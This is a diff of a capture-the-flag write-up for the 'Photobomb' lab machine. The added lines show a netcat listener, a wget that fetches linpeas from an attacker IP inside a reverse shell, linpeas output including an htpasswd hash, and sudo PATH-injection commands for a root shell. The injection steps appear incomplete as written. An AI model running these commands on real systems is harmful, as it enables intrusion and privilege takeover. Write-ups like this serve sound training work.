@@ -84,7 +84,7 @@ dirsearch -u photobomb.htb
 
 #### /printer:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 * We are met with a page that allows you to download images with different file types and dimensions
 * Let's download an image and capture the request in burp
@@ -139,14 +139,127 @@ nc -lnvp 1337
 
 Append reverse shell to POST request and send to the server:
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+* Be sure to upgrade your dummy shell to a fully-interactive one
+
+{% content-ref url="../../../fully-interactive-shell-upgrade.md" %}
+[fully-interactive-shell-upgrade.md](../../../fully-interactive-shell-upgrade.md)
+{% endcontent-ref %}
 
 ## Privilege Escalation
 
+After some manual enumeration, I was unable to find anything. Let's load up linpeas and see if we can find anything.
+
+#### File Transfer
+
+Linpeas Link: [https://github.com/carlospolop/PEASS-ng/releases/download/20230418-edede4b8/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/download/20230418-edede4b8/linpeas.sh)
+
+On attacker machine, run:&#x20;
+
+```
+python3 -m http.server 80
+```
+
+In reverse shell, run:
+
+```
+wget http://10.10.14.38:80/linpeas.sh
+```
+
 ### Local enumeration
+
+Linpeas output:
+
+```
+Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw-r--r-- 1 root root 40960 Mar 17  2022 /var/backups/alternatives.tar.0
+
+Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
+Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
+Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001
+
+Backup files (limited 100)
+/home/wizard/photobomb/log/photobomb.log.old
+
+Unexpected in /opt (usually empty)
+cleanup.sh ****
+
+Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+
+Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'
+drwxr-xr-x 2 root root 4096 Sep 16  2022 /etc/ldap
+
+Analyzing Htpasswd Files (limit 70)
+-rw-rw-r-- 1 wizard wizard 44 Sep 14  2022 /home/wizard/photobomb/.htpasswd
+pH0t0:$apr1$dnyF00ZD$9PifZwUxL/J0BCS/wTShU1
+
+curl this http://127.0.0.1:4567
+
+/opt/cleanup.sh runs every 5 mins ****
+```
+
+Viewing sudo permissions with `sudo -l`:
+
+```
+sudo -l
+
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+```
+
+* <mark style="color:yellow;">This is an obvious sign to path injection</mark>
+* <mark style="color:yellow;">env\_reset and /opt/cleanup.sh is a binary that can run with sudo (root) permissions with NOPASSWD</mark>
 
 ### PrivEsc vector
 
-## Proofs
+#### Path Injection
+
+View permissions:
+
+```
+sudo -l
+```
+
+Navigate to globally writeable directory:
+
+```
+cd /dev/shm
+```
+
+Create malicious file:
+
+malicious:
+
+```
+#!/bin/bash
+
+bash
+```
+
+Export Path Variable:
+
+```
+export PATH=/dev/shm:$PATH
+```
+
+chmod malicous to add executable bit:
+
+```
+chmod +x malicious
+```
+
+Use vulnerable sudo permissions to obtain new bash shell with sudo permissions granting root:
+
+```
+sudo PATH=/dev/shm:$PATH /opt/cleanup.sh
+```
